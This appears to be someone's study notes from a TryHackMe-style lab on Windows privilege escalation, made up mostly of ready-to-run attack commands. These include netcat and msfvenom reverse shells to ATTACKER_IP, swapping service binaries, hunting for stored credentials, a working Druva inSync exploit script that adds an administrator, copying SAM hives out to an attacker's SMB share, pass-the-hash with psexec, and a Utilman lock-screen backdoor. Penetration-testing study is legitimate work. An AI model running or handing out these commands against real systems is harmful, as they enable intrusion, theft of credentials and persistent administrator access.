
windows enum: [https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASps1/winPEAS.ps1](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASps1/winPEAS.ps1)


  
Create account in windows:
```
net user <username> <password> /add

net localgroup administrators <username> /add
```

  

User types: Administrators, Standard Users

Special service accounts: “SYSTEM / LocalSystem”, “Local Service”, “Network Service”

  

  

RDP command: 

xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.240.249 /u:thm-unpriv /p:'Password321'

  

  

————

1. Harvesting passwords

  

- From unattended installation: installation that doesn’t require manual interaction

  

Common places where the configurations are stored:

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

  

Sample credentials

<Credentials>

    <Username>Administrator</Username>

    <Domain>thm.local</Domain>

    <Password>MyPassword123</Password>

</Credentials>

  

  

# Powershell history from cmd.exe: 

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

  

# Powershell history from powershell: 

Write-Output $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

  

# Powershell history from powershell command

cat (Get-PSReadlineOption).HistorySavePath

  

- Saved windows credentials: `cmdkey /list` 
- Saved red can be used to run as other user: `runas /savecred /user:admin cmd.exe`

  

  

- Plain text IIS configuration

config locations

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

  

maybe database string contains password:

`type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`

  

  

- PuTTY credentials: `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
- any other software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.`

  


  

  

1. Scheduled tasks

  

- List scheduled tasks: `schtasks`
- Find task details for ‘vulntask’: `schtasks /query /tn vulntask /fo list /v`
- Check executable file ‘Task To Run’ and privilege from ‘Run As User’
- Check permission on the executable: `icacls c:\tasks\schtask.bat`
- Run the task on demand: `schtasks /run /tn vulntask`

  

Update bin script:

echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat

  

1. Always elevated Executables: Always run the executable with higher privilege

  

It works only if both these keys are set

C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

  

Generate the executable:

  

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

  

Run the above executable

msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

  

  

1. Service Configurations

  

- Windows services are managed by the **Service Control Manager** (SCM)
- All of the services configurations are stored on the registry under HKLM\SYSTEM\CurrentControlSet\Services\: ‘**ImagePath’** is the executable path, ‘**ObjectName’** is the user name, ‘**Security’** is the access controls

  

# Query service details

# Executable path is given by '**BINARY_PATH_NAME'**

**# Run user: 'SERVICE_START_NAME'**

sc qc apphostsvc

  

# Create windows binary:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.18.222 LPORT=4445 -f exe-service -o rev-svc.exe

  

  

# Serve the file

python3 -m http.server

  

  

# Download the file

wget http://10.2.18.222:8000/rev-svc.exe -O rev-svc.exe

  

# Copy the file to correct place

  

C:\> cd C:\PROGRA~2\SYSTEM~1\

  

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp

        1 file(s) moved.

  

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe

        1 file(s) moved.

  

  

# Give executable permission to all

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F

        Successfully processed 1 files.

  

# Restart the service

  

C:\> sc.exe stop windowsscheduler

C:\> sc.exe start windowsscheduler

  

1. Unquoted Service Paths

  

# Path is quoted

sc qc "vncserver"

  

# Path is unquoted

# Valid paths:

# C:\MyPrograms\Disk.exe

# C:\MyPrograms\Disk Sorter.exe

# C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe

sc qc "disk sorter enterprise"

  

# Move the malicious binary to any of the path if the path is writable

  

  

  

1. Insecure Service Permissions

  

- use access check from sys internals : [https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)

  

# Check servicee permissions

 accesschk64.exe -qlc thmservice

  

# After getting the malicious binary to target machine, update the service config

sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem

  

# Restart the service

sc stop THMService

sc start THMService

  

  

1. Unpatched software

  

we can search for existing exploits on the installed software online on sites like [exploit-db](https://www.exploit-db.com/), [packet storm](https://packetstormsecurity.com/) , Google or others.

  

# List installd softwares

wmic product get name,version,vendor

  

# Add new user and pass

net user pwnd SimplePass123 /add 

net localgroup administrators pwnd /add

  

# Check if user is created

net user pwnd

  

Druva inSync exploit

$ErrorActionPreference = "Stop"

  

$cmd = "net user pwnd /add"

  

$s = New-Object System.Net.Sockets.Socket(

    [System.Net.Sockets.AddressFamily]::InterNetwork,

    [System.Net.Sockets.SocketType]::Stream,

    [System.Net.Sockets.ProtocolType]::Tcp

)

$s.Connect("127.0.0.1", 6064)

  

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")

$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")

$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");

$length = [System.BitConverter]::GetBytes($command.Length);

  

$s.Send($header)

$s.Send($rpcType)

$s.Send($length)

$s.Send($command)

  

1. User privileges

  

# check privileges

# List of all privileges: [https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)

# Check privileges for escalation: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)

whoami /priv

  

# Privilege: SeBackup / SeRestore

  

# Backup SAM and system hashes

reg save hklm\system C:\Users\THMBackup\system.hive

reg save hklm\sam C:\Users\THMBackup\sam.hive

  

  

  

# Copy hive files to our own machine

  

# Start SMB share on our own machine

mkdir share

python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share

  

# Copy files from target machine

C:\> copy C:\Users\THMBackup\sam.hive \\10.2.18.222\public\

C:\> copy C:\Users\THMBackup\system.hive \\10.2.18.222\public\

  

# retrieve password hashes

python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL

  

  

# Pass the hash to gain admin access

python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.210.117

  

# Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

  

# Privilege: SeTakeOwnership

# User can take ownership of any file

# Example, own utilman.exe

C:\> takeown /f C:\Windows\System32\Utilman.exe

  

# Update your privilege level

icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F

  

# Now replace the binary

copy cmd.exe utilman.exe

  

# Now when we click on 'Ease of Access' on lock screen, we will get cmd with admin access

  

# Private: SeImpersonate / SeAssignPrimaryToken

# These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

  

# To elevate privileges using such accounts, an attacker needs the following: 

# 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 

# 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

  

# Eg. use RogueWinRM exploit to accomplish both conditions.

# Run the exploit

RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"

  

Enumerate escalation options:

  

# WinPEAS: [https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

winpeas.exe > outputfile.txt

  

  

# PrivescCheck.ps1: [https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)

PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force

PS C:\> . .\PrivescCheck.ps1

PS C:\> Invoke-PrivescCheck

  

  

# WES-NG: Windows Exploit Suggester - Next Generation: [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

wes.py --update

systeminfo > systeminfo.txt

wes.py systeminfo.txt

  

# Metasploit Meterpreter

multi/recon/local_exploit_suggester

  

  

  

Additional techniques

  

- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
- [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
- [Decoder's Blog](https://decoder.cloud/)
- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)